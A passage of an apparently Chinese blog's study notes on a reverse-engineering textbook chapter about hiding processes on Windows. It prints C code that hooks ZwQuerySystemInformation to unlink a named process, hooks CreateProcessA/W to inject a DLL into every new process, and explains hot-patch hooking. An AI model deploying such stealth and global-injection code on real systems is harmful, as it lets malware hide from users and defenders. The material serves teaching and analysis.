class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c">NTSTATUS WINAPI <span class="hljs-title function_">NewZwQuerySystemInformation</span><span class="hljs-params">(</span><br><span class="hljs-params">                SYSTEM_INFORMATION_CLASS SystemInformationClass, </span><br><span class="hljs-params">                PVOID SystemInformation, </span><br><span class="hljs-params">                ULONG SystemInformationLength, </span><br><span class="hljs-params">                PULONG ReturnLength)</span><br>&#123;<br>    NTSTATUS status;<br>    FARPROC pFunc;<br>    PSYSTEM_PROCESS_INFORMATION pCur, pPrev;<br>    <span class="hljs-type">char</span> szProcName[MAX_PATH] = &#123;<span class="hljs-number">0</span>,&#125;;<br>    <br>    <span class="hljs-comment">// 开始前先“脱钩”</span><br>    unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);<br><br>    <span class="hljs-comment">// 调用原始API</span><br>    pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL), <br>                           DEF_ZWQUERYSYSTEMINFORMATION);<br>    status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)<br>              (SystemInformationClass, SystemInformation, <br>              SystemInformationLength, ReturnLength);<br><br>    <span class="hljs-keyword">if</span>( status != STATUS_SUCCESS )<br>        <span class="hljs-keyword">goto</span> __NTQUERYSYSTEMINFORMATION_END;<br><br>    <span class="hljs-comment">// 仅针对SystemProcessInformation操作</span><br>    <span class="hljs-keyword">if</span>( SystemInformationClass == SystemProcessInformation )<br>    &#123;<br>        <span class="hljs-comment">// SYSTEM_PROCESS_INFORMATION 类型转换</span><br>        <span class="hljs-comment">// pCur是单向链表的头</span><br>        pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;<br><br>        <span class="hljs-keyword">while</span>(TRUE)<br>        &#123;<br>            <span class="hljs-comment">// 比较进程名称</span><br>            <span class="hljs-comment">// g_szProcName 为要隐藏的进程名称</span><br>            <span class="hljs-comment">// (=&gt; 在SetProcName()设置)</span><br>            <span class="hljs-keyword">if</span>(pCur-&gt;Reserved2[<span class="hljs-number">1</span>] != <span class="hljs-literal">NULL</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(!_tcsicmp((PWSTR)pCur-&gt;Reserved2[<span class="hljs-number">1</span>], g_szProcName))<br>                &#123;<br>                    <span class="hljs-comment">// 从链表中删除隐藏进程的点</span><br>                    <span class="hljs-keyword">if</span>(pCur-&gt;NextEntryOffset == <span class="hljs-number">0</span>)<br>                        pPrev-&gt;NextEntryOffset = <span class="hljs-number">0</span>;<br>                    <span class="hljs-keyword">else</span><br>                        pPrev-&gt;NextEntryOffset += pCur-&gt;NextEntryOffset;<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                    pPrev = pCur;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span>(pCur-&gt;NextEntryOffset == <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-comment">// 链表的下一项</span><br>            pCur = (PSYSTEM_PROCESS_INFORMATION)<br>                    ((ULONG)pCur + pCur-&gt;NextEntryOffset);<br>        &#125;<br>    &#125;<br><br>__NTQUERYSYSTEMINFORMATION_END:<br><br>    <span class="hljs-comment">// 函数终止前，再次执行API钩取操作，为下次调用做准备</span><br>    hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, <br>                 (PROC)NewZwQuerySystemInformation, g_pOrgBytes);<br><br>    <span class="hljs-keyword">return</span> status;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>对NewZwQuerySystemInformation()函数的结构简要说明如下： </p><p>□ “脱钩” ZwQuerySystemInformation()函数； </p><p>□调用 ZwQuerySystemInformation()； </p><p>□检查SYSTEM_PROCESS_INFORMATION结构体链表，查找要隐藏的进程； </p><p>□查找到要隐藏的进程后，从链表中移除； </p><p>□挂钩（hook） ZwQuerySystemInformation()。</p><p>NewZwQuerySystemInformation()函数代码的中间部分有一个while()语句，它用来检PROCESS_INFORMATION结构体链表，比较进程名称（pCur-&gt;Reserved2[1]）（进程名称为Unicode字符串）。如果掌握了函数的工作原理，再结合代码注释，相信大家在理解上应该没什么困难。</p><h1 id="33-6-全局API钩取"><a href="#33-6-全局API钩取" class="headerlink" title="33.6 全局API钩取"></a>33.6 全局API钩取</h1><p>本节正式开始讲解全局API钩取的概念及具体实现方法。全局API钩取实质也是一种API钩取技术，它针对的进程为：①当前运行的所有进程；②将来要运行的所有进程。</p><p>请注意，前面讲解过的示例程序（HidePmc.exe、stealth.dll）并不是全局API钩取的例子，因为它并不满足全局API钩取定义中的第②个条件。也就是说，虽然运行HideProc.exe将notepad.exe 进程隐藏起来，但是若重新运行新的Process Exploer （或者task manager）, notepad.exe进程在它们之中仍然可见。原因在于，运行HideProc.exe后未对新创建的进程（自动）注入stealth.dll文件。有多种方法可以解决这一问题，全局API钩取就是其中一种，下面讲解该技术的具体实现方法。</p><h2 id="33-6-1-Kernel32-CreateProcess-API"><a href="#33-6-1-Kernel32-CreateProcess-API" class="headerlink" title="33.6.1 Kernel32.CreateProcess() API"></a>33.6.1 Kernel32.CreateProcess() API</h2><p>Kernel32.CreateProcess() API用来创建新进程。其他启动运行进程的API （WinExec()、ShellExecute()、system()）在其内部调用的也是该CreateProcess()函数（出处：MSDN）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">CreateProcess</span><span class="hljs-params">(</span><br><span class="hljs-params">  [in, optional]      LPCSTR                lpApplicationName,</span><br><span class="hljs-params">  [in, out, optional] LPSTR                 lpCommandLine,</span><br><span class="hljs-params">  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,</span><br><span class="hljs-params">  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,</span><br><span class="hljs-params">  [in]                BOOL                  bInheritHandles,</span><br><span class="hljs-params">  [in]                DWORD                 dwCreationFlags,</span><br><span class="hljs-params">  [in, optional]      LPVOID                lpEnvironment,</span><br><span class="hljs-params">  [in, optional]      LPCSTR                lpCurrentDirectory,</span><br><span class="hljs-params">  [in]                LPSTARTUPINFOA        lpStartupInfo,</span><br><span class="hljs-params">  [out]               LPPROCESS_INFORMATION lpProcessInformation</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>因此，向当前运行的所有进程注入stealth.dll后，如果在stealth.dll中将CreateProcess() API他一起钩取，那么以后运行的进程也会自动注入stealth.dll文件。进一步说明如下：由于所有进程都是由父进程（使用CreateProcess()）创建的，所以，钩取父进程的CreateProcess() API就可以将stealth.dll文件注入所有子进程（父进程通常都是explorer.exe）。怎么样？这个想法不错吧？全局API钩取的 实现方法没有想得那么难，但钩CreateProcess() API时，要充分考虑以下几个方面。</p><p>（1） 钩取CreateProcess() API时，还要分别钩取kernel32.CreateProcessA()、kernel32.CreateProcessW()<br>这2个API （ASCII版本与Unicode版本）。 </p><p>（2） CreateProcessA()、CreateProcessW()函数内部又分别调用了CreateProcessInternalA()、<br>CreateProcessInternelW()函数。常规编程中会大量使用CreateProcess()函数，但是微软的部分软件<br>产品中会直接调用CreateProcessInternelA&#x2F;W这2个函数。所以具体实现全局API钩取时，为了准确<br>起见，还要同时钩取上面2个函数（若可能，尽量钩取低级API）。</p><p> （3） 钩取函数（NewCreateProcess）要钩取调用原函数（CreateProcess）而创建的子进程的API。<br>因此，极短时间内，子进程可能在未钩取的状态下运行。</p><p>我们进行全局API钩取时必须解决上面这些问题。幸运的是，很多代码逆向分析高手通过努力发现了比kernel32.CreateProcess()更低级的API,钩取它效果会更好（能够一次性解决上面所有问题）。这个API就是ntdll.ZwResumeThread() API。</p><h2 id="33-6-2-Ntdll-ZwResumeThread-API"><a href="#33-6-2-Ntdll-ZwResumeThread-API" class="headerlink" title="33.6.2 Ntdll.ZwResumeThread() API"></a>33.6.2 Ntdll.ZwResumeThread() API</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">ZwResumeThread(<br>    INHANDLEThreadHandle,<br>    OUTPULONGSuspendCount OPTIONAL<br>); <br></code></pre></td></tr></table></figure><blockquote><p>用户模式下，NtXXX系列与ZwXXX系列仅是名称不同，它们其实是相同的API。</p></blockquote><p>ZwResumeThread()函数（出处：MSDN）在进程创建后、主线程运行前被调用执行（在CreateProcess()API内部调用执行）。所以只要钩取这个函数，即可在不运行子进程代码的状态下钩取API。但需要注意的是，ZwResumeThread()是一个尚未公开的API，将来的某个时候可能会被改变，这就无法保障安全性。所以，钩取类似ZwResumeThread()的尚未公开API时，要时刻记得，随着OS补丁升级，该API可能更改，这可能使在低版本中正常运行的钩取操作到了新版本中突然无法正常运行。</p><h1 id="33-7-练习-2-（HideProc2-exe-Stealth2-dll）"><a href="#33-7-练习-2-（HideProc2-exe-Stealth2-dll）" class="headerlink" title="33.7 练习#2 （HideProc2.exe,Stealth2.dll）"></a>33.7 练习#2 （HideProc2.exe,Stealth2.dll）</h1><blockquote><p>stealth2.dll 用来钩取 CreateProcess,钩取 ZwResumeThread 请参考第34章。本练习示例在Windows XP SP3 &amp; Windows 7 （32位）环境下通过测试。</p></blockquote><p>请注意，为操作简单，本练习中我们将只隐藏notepad.exe。</p><h2 id="33-7-1-复制-stealth2-dll-文件到-SYSTEM-文件夹中"><a href="#33-7-1-复制-stealth2-dll-文件到-SYSTEM-文件夹中" class="headerlink" title="33.7.1 复制 stealth2.dll 文件到%SYSTEM%文件夹中"></a>33.7.1 复制 stealth2.dll 文件到%SYSTEM%文件夹中</h2><p>为了把stealth2.dll文件注入所有运行进程，首先要把stealth2.dll文件复制到%SYSTEM%文件夹，所有进程都能识别该路径，如图33-12所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B.assets/image-20220305203320883.png" alt="图33-12 复制stealth2.dll"></p><h2 id="33-7-2-运行-HideProc2-exe-hide"><a href="#33-7-2-运行-HideProc2-exe-hide" class="headerlink" title="33.7.2 运行 HideProc2.exe -hide"></a>33.7.2 运行 HideProc2.exe -hide</h2><p>与以前的HideProc.exe相比，HideProc2.exe只是运行参数发生了改变。由于要隐藏的进程名<br>称被硬编码为notepad.exe，所以运行隐藏程序时不需要再输入。使用-hide选项运行HideProc2.exe<br>后，全局API钩取就开始了（请各位使用Process Explorer查看c:\windows\system32\stealth2.dll文件<br>是否正常注入运行进程），如图33-13所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B.assets/image-20220305203755162.png" alt="图33-13 运行HideProc2.exe（隐藏）"></p><h2 id="33-7-3-运行-ProcExp-exe-amp-notepad-exe"><a href="#33-7-3-运行-ProcExp-exe-amp-notepad-exe" class="headerlink" title="33.7.3 运行 ProcExp.exe&amp;notepad.exe"></a>33.7.3 运行 ProcExp.exe&amp;notepad.exe</h2><p>请运行多个Process Explorer （或者任务管理器）与notepad程序，如图33-14所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B.assets/image-20220305203914136.png" alt="图33-14 Process Explorer 与 notepad"></p><p>从图33-14中可以看到，分别运行了2个ProcExp.exe与notepad.exe进程。但是ProcExp.exe中却看不到notepad.exe进程，它被隐藏起来了。大家可以尝试多运行几个ProcExp.exe，最终结果都是一样的，新创建的ProcExp.exe进程中，notepad.exe进程都被隐藏起来、都是不可见的。这就是全局API钩取要实现的效果。</p><h2 id="33-7-4-运行-HideProc2-exe-show"><a href="#33-7-4-运行-HideProc2-exe-show" class="headerlink" title="33.7.4 运行 HideProc2.exe -show"></a>33.7.4 运行 HideProc2.exe -show</h2><p>运行HideProc2.exe-show命令，撤销全局API钩取操作，如图33-15所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B.assets/image-20220305204036369.png" alt="图33-15 运行HideProc2.exe（撤销隐藏）"></p><p>现在Process Explorer （或者任务管理器）中又能看到notepad.exe进程了。</p><h1 id="33-8-源代码分析"><a href="#33-8-源代码分析" class="headerlink" title="33.8 源代码分析"></a>33.8 源代码分析</h1><h2 id="33-8-1-HideProc2-cpp"><a href="#33-8-1-HideProc2-cpp" class="headerlink" title="33.8.1 HideProc2.cpp"></a>33.8.1 HideProc2.cpp</h2><p>与前面的HideProc.cpp相比，HideProc2.cpp只是减少了运行参数的个数，相关讲解请参考前面的内容。</p><h2 id="33-8-2-stealth2-cpp"><a href="#33-8-2-stealth2-cpp" class="headerlink" title="33.8.2 stealth2.cpp"></a>33.8.2 stealth2.cpp</h2><p>与前面的stealth.cpp相比，stealth2.cpp的不同之处在于将要隐藏的进程名称硬编码为notepad.exe，并且添加了钩取CreateProcessA()API与CreateProcessW() API的代码，以便实现全局钩取操作。</p><p><strong>DIIMain()</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL WINAPI <span class="hljs-title function_">DllMain</span><span class="hljs-params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span><br>&#123;<br>    <span class="hljs-type">char</span>            szCurProc[MAX_PATH] = &#123;<span class="hljs-number">0</span>,&#125;;<br>    <span class="hljs-type">char</span>            *p = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">// 异常处理使注入不会发生在HideProc2.exe进程</span><br>    GetModuleFileNameA(<span class="hljs-literal">NULL</span>, szCurProc, MAX_PATH);<br>    p = <span class="hljs-built_in">strrchr</span>(szCurProc, <span class="hljs-string">&#x27;\\&#x27;</span>);<br>    <span class="hljs-keyword">if</span>( (p != <span class="hljs-literal">NULL</span>) &amp;&amp; !_stricmp(p+<span class="hljs-number">1</span>, <span class="hljs-string">&quot;HideProc2.exe&quot;</span>) )<br>        <span class="hljs-keyword">return</span> TRUE;<br><br>    <span class="hljs-comment">// 改变 privilege</span><br>    SetPrivilege(SE_DEBUG_NAME, TRUE);<br><br>    <span class="hljs-keyword">switch</span>( fdwReason )<br>    &#123;<br>        <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH : <br>            <span class="hljs-comment">// hook</span><br>            hook_by_code(<span class="hljs-string">&quot;kernel32.dll&quot;</span>, <span class="hljs-string">&quot;CreateProcessA&quot;</span>, <br>                         (PROC)NewCreateProcessA, g_pOrgCPA);<br>            hook_by_code(<span class="hljs-string">&quot;kernel32.dll&quot;</span>, <span class="hljs-string">&quot;CreateProcessW&quot;</span>, <br>                         (PROC)NewCreateProcessW, g_pOrgCPW);<br>            hook_by_code(<span class="hljs-string">&quot;ntdll.dll&quot;</span>, <span class="hljs-string">&quot;ZwQuerySystemInformation&quot;</span>, <br>                         (PROC)NewZwQuerySystemInformation, g_pOrgZwQSI);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH :<br>            <span class="hljs-comment">// unhook</span><br>            unhook_by_code(<span class="hljs-string">&quot;kernel32.dll&quot;</span>, <span class="hljs-string">&quot;CreateProcessA&quot;</span>, <br>                           g_pOrgCPA);<br>            unhook_by_code(<span class="hljs-string">&quot;kernel32.dll&quot;</span>, <span class="hljs-string">&quot;CreateProcessW&quot;</span>, <br>                           g_pOrgCPW);<br>            unhook_by_code(<span class="hljs-string">&quot;ntdll.dll&quot;</span>, <span class="hljs-string">&quot;ZwQuerySystemInformation&quot;</span>, <br>                           g_pOrgZwQSI);<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>从以上DIIMain()函数代码中可以看到，新增了对CreateProcessA()、CreateProcessW() API进行钩取&#x2F; “脱钩”的代码。</p><p><strong>NewCreateProcessA()</strong><br>下面看看NewCreateProcessA()函数代码，它是钩取CreateProcessA() API的函数（代码与NewCreateProcessW()几乎一样）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL WINAPI <span class="hljs-title function_">NewCreateProcessA</span><span class="hljs-params">(</span><br><span class="hljs-params">    LPCTSTR lpApplicationName,</span><br><span class="hljs-params">    LPTSTR lpCommandLine,</span><br><span class="hljs-params">    LPSECURITY_ATTRIBUTES lpProcessAttributes,</span><br><span class="hljs-params">    LPSECURITY_ATTRIBUTES lpThreadAttributes,</span><br><span class="hljs-params">    BOOL bInheritHandles,</span><br><span class="hljs-params">    DWORD dwCreationFlags,</span><br><span class="hljs-params">    LPVOID lpEnvironment,</span><br><span class="hljs-params">    LPCTSTR lpCurrentDirectory,</span><br><span class="hljs-params">    LPSTARTUPINFO lpStartupInfo,</span><br><span class="hljs-params">    LPPROCESS_INFORMATION lpProcessInformation</span><br><span class="hljs-params">)</span><br>&#123;<br>    BOOL bRet;<br>    FARPROC pFunc;<br><br>    <span class="hljs-comment">// unhook</span><br>    unhook_by_code(<span class="hljs-string">&quot;kernel32.dll&quot;</span>, <span class="hljs-string">&quot;CreateProcessA&quot;</span>, g_pOrgCPA);<br><br>    <span class="hljs-comment">// 调用原始API</span><br>    pFunc = GetProcAddress(GetModuleHandleA(<span class="hljs-string">&quot;kernel32.dll&quot;</span>), <span class="hljs-string">&quot;CreateProcessA&quot;</span>);<br>    bRet = ((PFCREATEPROCESSA)pFunc)(lpApplicationName,<br>                                     lpCommandLine,<br>                                     lpProcessAttributes,<br>                                     lpThreadAttributes,<br>                                     bInheritHandles,<br>                                     dwCreationFlags,<br>                                     lpEnvironment,<br>                                     lpCurrentDirectory,<br>                                     lpStartupInfo,<br>                                     lpProcessInformation);<br><br>    <span class="hljs-comment">// 向生成的子进程中注入stealth2.dll</span><br>    <span class="hljs-keyword">if</span>( bRet )<br>        InjectDll2(lpProcessInformation-&gt;hProcess, STR_MODULE_NAME);<br><br>    <span class="hljs-comment">// hook</span><br>    hook_by_code(<span class="hljs-string">&quot;kernel32.dll&quot;</span>, <span class="hljs-string">&quot;CreateProcessA&quot;</span>, <br>                 (PROC)NewCreateProcessA, g_pOrgCPA);<br><br>    <span class="hljs-keyword">return</span> bRet;<br>&#125;<br></code></pre></td></tr></table></figure><p>NewCreateProcessA()函数代码比较简单。先执行“脱钩”操作（unhook_by_code），调用执行原函数，再将stealth2.dll注入（InjectDlI2）生成的子进程，最后再钩取（hook_by_code），为下次运行做准备。其中需要注意的是，注入stealth2.dll文件用的函数为InjectDll2()。以前的InjectDll()函数通过PID获取进程句柄进行注入（调用OpenProcess() API），但在上述示例中调用CreateProcessA() API时，能自然而然获得子进程的句柄（lpProcessInformation-&gt;hProcess），请留意这一点。</p><p>到此我们学习了有关全局API钩取的内容。由于它是一种钩取系统全部进程的技术，所以有时会引发意料之外的错误。使用这项技术前必须仔细测试。另外，钩取尚未公开的API时，一定要检查它在当前OS版本中能否正常运行。</p><h1 id="33-9-利用“热补丁”技术钩取API"><a href="#33-9-利用“热补丁”技术钩取API" class="headerlink" title="33.9 利用“热补丁”技术钩取API"></a>33.9 利用“热补丁”技术钩取API</h1><h2 id="33-9-1-API代码修改技术的问题"><a href="#33-9-1-API代码修改技术的问题" class="headerlink" title="33.9.1 API代码修改技术的问题"></a>33.9.1 API代码修改技术的问题</h2><p>对代码33-8中NewCreateProcessA()函数的结构简单梳理如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">NewCreateProcessA(...)<br>&#123;<br>    <span class="hljs-comment">//①脱钩</span><br>    <br>    <span class="hljs-comment">//②调用原始API</span><br>    <br>    <span class="hljs-comment">//⑤注入</span><br>    <br>    <span class="hljs-comment">//④挂钩</span><br>&#125;<br></code></pre></td></tr></table></figure><p>为正常调用原API，需要先①“脱钩”（若不“脱钩”，调用②原始API就会陷入无限循环）。然后在钩取函数（NewCreateProcessA）返回前再次④挂钩，使之进人钩取状态。</p><p>也就是说，每当在程序内部调用CreateProcessA()API时，NewCreateProcessA()就会被调用执行，不断重复“脱钩” &#x2F;挂钩。这种反复进行的“脱钩”准钩操作不仅会造成整体性能低下，更 严重的是在多线程环境下还会产生运行时错误，这是由“脱钩” &#x2F;挂钩操作要对原API的前5个字节进行修改（覆写）引起的。</p><p>一个线程尝试运行某段代码时，若另一进程正在对该段代码进行“写”操作，这时就会出现冲突，最终引发运行时错误。所以我们需要一种更安全的API钩取技术。</p><p>《Windows核心编程》一书中曾指出，运用代码修改技术钩取API会对系统安全造成威胁。</p><h2 id="33-9-2-“热补丁”（修改7个字节代码）"><a href="#33-9-2-“热补丁”（修改7个字节代码）" class="headerlink" title="33.9.2 “热补丁”（修改7个字节代码）"></a>33.9.2 “热补丁”（修改7个字节代码）</h2><p>使用“热补丁”（HotPatch）技术比修改5个字节代码的方法更稳定，本小节将讲解有关“热补丁”技术的内容。</p><blockquote><p>“热补丁”对应的英文为Hot Patch或Hot Fix,与修改5个字节代码的技术不同，使用“热补丁”技术时将修改7个字节代码，所以该技术又称为7字节代码修改技术。</p></blockquote><p><strong>普通API起始代码的形态</strong></p><p>讲解“热补丁”技术前，先看看常用API的起始代码部分（参考图33-16至图33-19）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B.assets/image-20220305211925669.png" alt="图33-16 kernel32.CreateProcessA()"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B.assets/image-20220305212012044.png" alt="图33-17 kernel32丄oadLibraryAO"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B.assets/image-20220305212038993.png" alt="图33-18 user32.MessageBoxA()"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B.assets/image-20220305212332200.png" alt="图33-19 gdi32.TextOutW()"></p><p>以上列出的API起始代码有如下2个明显的相似点：</p><p>（1） API代码以”MOV EDI,EDI”指令开始（IA-32指令： 0x8BFF）。 </p><p>（2） API代码上方有5个NOP指令（IA-32指令： 0x90）。</p><p>MOV EDI，EDI指令大小为2个字节，用于将EDI寄存器的值再次传送到EDI寄存器，这没有什么实际意义。NOP指令为1个字节大小，不进行任何操作（NOPeration）（该NOP指令存在于函数与函数之间，甚至都不会被执行）。也就是说，API起始代码的MOV指令（2个字节）与其上方的5个NOP指令（5个字节）合起来共7个字节的指令没有任何意义。</p><p>很显然，kernel32.dll、user32.dll、gdi32.dll是Windows OS相当重要的库。那么微软到底为什么要使用这种方式来制作系统库呢？原因是为了方便“打热补丁”。“热补丁”由API钩取组成，在进程处于运行状态时临时更改进程内存中的库文件（重启系统时，修改的目标库文件会被完全取代）。</p><p><strong>工作原理及特征</strong></p><p>要理解“热补丁”钩取方法的核心原理，需要先了解该方法的2种特征。下面使用“热补丁”方法钩取图33-16中的kernel32.CreateProcessA()API，借此理解学习“热补丁”钩取的技术原理。</p><p>A.二次跳转</p><p>首先将API起始代码之前的5个字节修改为FAR JMP指令（E9 XXXXXXXX），跳转到用户钩取函数处（10001000）。然后将API起始代码的2个字节修改为SHORT JMP指令（EB F9）。该SHORT JMP指令用来跳转到前面的FAR JMP指令处（参考图33-20）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B.assets/image-20220305213701444.png" alt="图33-20 使用“热补丁”技术钩取CreateProcessA() API"></p><p>调用CreateProcessA() API时，遇到API起始地址（7C80236B）处的JMP SHORT 7C802366指 令，就会跳转到紧接在其上方的指令地址（7C802366）。然后遇到JMP 10001000指令，跳转到实际钩取的函数地址（10001000）。像这样经过2次连续跳转，就完成了对指定API的钩取操作（我将这种技术称为“二次跳转”，其优点稍后介绍）。这一过程中需要注意的是，我们修改的7个字节的指令（NOP*5、MOV EDI,EDI）原来都是毫无意义的。</p><blockquote><p>从图33-20中的7C802366、7C80236B地址可以看到，虽然都是JMP指令，但指 令形态不同。7C802366地址处的指令形式为E9 XXXXXXXX,大小为5个字节，被称 为FAR JMP,用来实现远程跳转（可以跳转到进程内存用户区域中的任意位置）；而 7C80236B地址处的指令形式为EB YY，大小为2个字节，被称为SHORT JMP,它只能以当前EIP为基准，在-128〜127范围内跳转。IA-32指令中有些相同指令拥有不同指令形态，IA-32指令的解析方法请参考第49章。</p></blockquote><p>B.不需要在钩取函数内部进行“脱钩” &#x2F;挂钩操作</p><p>前面讲解过修改代码的前5个字节进行钩取的技术，使用时需要在钩取函数NewCreateProcessA()内部反复“脱钩” &#x2F;挂钩，这可能导致系统稳定性下降。</p><p>而使用“热补丁”技术钩取API时，不需要在钩取函数内部进行“脱钩” &#x2F;挂钩操作。在5字节代码修改技术中“脱钩” &#x2F;挂钩是为了 “调用原函数”，而使用“热补丁”技术钩取API时，在API代码遭到修改的状态下也能正常调用原API。这是因为，从API角度看只是修改了其起始代码的<code>MOV EDI,EDI</code>指令（无意义的2个字节），从[API起始地址+2]地址开始，仍然能正常调用原API，且执行的动作也完全一样。 以Kernel32.CreateProcessA()为例，从图33-16所示的原API起始地址（7C80236B）开始执行，与从图33-20中的[API起始地址+2]地址（7C80236B）开始执行，结果完全一样。由于钩取函数中去除了 “脱钩” &#x2F;挂钩操作，在多线程环境下使API钩取变得稳定。这正是二次跳转的优势所在。</p><h1 id="33-10-练习-3-stealth3-dll"><a href="#33-10-练习-3-stealth3-dll" class="headerlink" title="33.10 练习 #3: stealth3.dll"></a>33.10 练习 #3: stealth3.dll</h1><p>stealth3.dll文件中使用了 “热补丁” API钩取技术，下面用它练习，如图33-22所示</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC33%E7%AB%A0%20%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B.assets/image-20220305220443798.png" alt="图33-22 stealth3.dll练习（隐藏）"></p><p>练习方法与stealth2.dll—样。先把stealth3.dll文件复制到％SYSTEM%文件夹，然后在命令行窗口运行HideProc2.exe命令，如图33-22所示（操作步骤与练习2的步骤1-4相同）。由于HideProc2.exe命令未做改动，像之前一样使用就可以了（隐藏notepad.exe进程的行为是相同的）。</p><blockquote><p>练习示例在Windows XP SP3&amp; Windows 7 （32位）系统环境中通过测试。</p></blockquote><h1 id="33-11-源代码分析"><a href="#33-11-源代码分析" class="headerlink" 